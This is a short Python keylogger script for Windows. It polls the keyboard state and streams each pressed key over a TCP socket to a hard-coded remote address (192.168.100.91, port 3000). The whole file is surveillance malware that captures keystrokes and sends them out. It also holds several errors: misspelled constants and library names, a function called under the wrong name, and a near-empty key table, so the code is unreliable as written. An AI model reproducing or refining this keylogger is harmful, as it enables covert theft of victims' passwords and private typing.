import socket
import ctypes 
import time

serverAddress = ("192.168.100.91",3000)
clientsocket = socket.socket(socket.AF_INEF,socket.SOCK_STREAM)
clientsocket.connect(serverAddress)

user = ctypes.windll.users32



def getkey(code):
	asciiTable = {
		"0": "[NUL]", 
		"1":"[LCLICK]",
	}
	return asciiTable[code]	
	
def main():
	keyStates = {} # keep track if each key is pressed
	while True: # while loop ensure that keylogger is continuesly monitor keyboard
		for i in range(256): # iteratae all possible key stroke from 0 to 256
			if user.GetAsyncKeyState(i) & 0x8000 != 0: # if key is curr pressed
				if keyStates.get(i,False) == False:
					keyStates[i] = True
					#checking if caps lock is off 
					key = getKey(str(i))
					if user.GetKeyStates(0x14) & 0x0001 == 0:
						key = key.lower()
					clientsocket.sendall(key.encode())
						
			else:
				keyStates[i] = False
			time.sleep(0.01)			
		
if __name__ == "__main__":
	main()		
		
		
		
		
			
